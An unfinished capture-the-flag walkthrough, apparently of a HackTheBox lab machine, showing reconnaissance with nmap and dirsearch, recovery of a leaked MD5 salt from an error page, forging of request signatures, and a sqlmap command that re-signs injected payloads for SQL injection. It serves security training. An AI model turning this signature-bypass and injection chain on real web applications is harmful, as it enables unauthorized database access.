## ----------------->> Proper <<----------------

// We start with nmap scan

    $nmap -sV -A -Pn -T4 10.10.10.231 -p-
----------

    Nmap scan report for 10.10.10.231
    Host is up (0.23s latency).
    Not shown: 65534 filtered ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: OS Tidy Inc.
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

// We can see only port 80(http) open, Lets check it out

![Image 1]()

// Its seems like some company products website,

// Move on to search for interesting directories or files with [dirsearch](https://github.com/maurosoria/dirsearch)(By maurosoria)

    $ python3 dirsearch.py -u http://10.10.10.231/ -t 100 -w /usr/share/dirb/wordlists/big.txt 
--------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 20469

    Output File: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/reports/10.10.10.231/_21-08-24_09-17-58.txt

    Error Log: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/logs/errors-21-08-24_09-17-58.log

    Target: http://10.10.10.231/

    [09:17:58] Starting: 
    [09:18:07] 301 -  150B  - /assets  ->  http://10.10.10.231/assets/
    [09:18:26] 301 -  152B  - /licenses  ->  http://10.10.10.231/licenses/

    Task Completed

// We found two directories /assets/ its Forbbiden but /licenses/ get us to login page

![Image 4]()

// guessing and sql injection syntaxes didnt work...

// Moving on to BurpSuite and open the first page (http://10.10.10.231/index.html) With Reapeter

// The response shows us that there another directory that load with the /index.html

![Image 2]()

    /products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b
    
// Navigating to there, shows us all the company products

![Image 3]()

// Also 'order=id+desc' looks like SQL query i will change desc to asc(read more abot [desc&asc](https://www.guru99.com/order-by-desc-and-asc.html))

![Image 5]()

// We got Forbidden page, Moving on...

// When removing the md5 hash from the browser we got error for parameter missing

![Image 6]()

// Lets try to remove 'h' parameter

// Now we get the same error but this time we get also crash details

![Image 7]()

// We got the secure-salt !

    'SECURE_PARAM_SALT','hie0shah6ooNoim'

// Lets check the hash with online hash-analyzer [tool](https://www.tunnelsup.com/hash-analyzer/)

![Image 8]()

// its md5 hash, we need to encrypt the salt now, we can do that with md5sum tool or online [tool](https://www.md5online.org/md5-encrypt.html)

    The MD5 hash for hie0shah6ooNoim is : 9094e65be4a9dc27cd4af70674a99c64

// And check the response status with curl

    $ curl -I http://10.10.10.231/products-ajax.php?order=id+asc&h='9094e65be4a9dc27cd4af70674a99c64'
-----

    HTTP/1.1 500 Internal Server Error
    Content-Length: 0
    Content-Type: text/html; charset=UTF-8
    Server: Microsoft-IIS/10.0
    X-Powered-By: PHP/7.4.1
    Date: Tue, 24 Aug 2021 19:03:47 GMT

// we got status 500 (Internal Error)

// After some tries it work when i encrypted the salt and add 'id acs' - "hie0shah6ooNoimid asc"

    $ echo -n "hie0shah6ooNoimid asc" | md5sum
    181345bd7fce37aad011ea65a41b60c8  -

// And lets check it

    $ curl -I 'http://10.10.10.231/products-ajax.php?order=id+asc&h=181345bd7fce37aad011ea65a41b60c8'
-----

    HTTP/1.1 200 OK
    Content-Length: 0
    Content-Type: text/html; charset=UTF-8
    Server: Microsoft-IIS/10.0
    X-Powered-By: PHP/7.4.1
    Date: Tue, 24 Aug 2021 18:49:52 GMT

// It worked !

// Now that we know the salt worked we can proceed to [sqlmap](https://github.com/sqlmapproject/sqlmap)tool with [this](https://securitypadawan.blogspot.com/2014/01/using-sqlmaps-eval-functionality-for.html) help to understand.

$sqlmap -u http://10.10.10.231/products-ajax.php?order=id+asc&h=181345bd7fce37aad011ea65a41b60c8 -p order --eval="import hashlib ; h=hashlib.md5(('hie0shah6ooNoim'+order).encode('utf-8')).hexdigest()" -v 5 --dbs



https://github.com/evyatar9/Writeups/tree/master/HackTheBox/Proper

http://10.10.10.231/products-ajax.php?order=id+desc&h=9094e65be4a9dc27cd4af70674a99c64

The MD5 hash for hie0shah6ooNoimid asc is : 181345bd7fce37aad011ea65a41b60c8
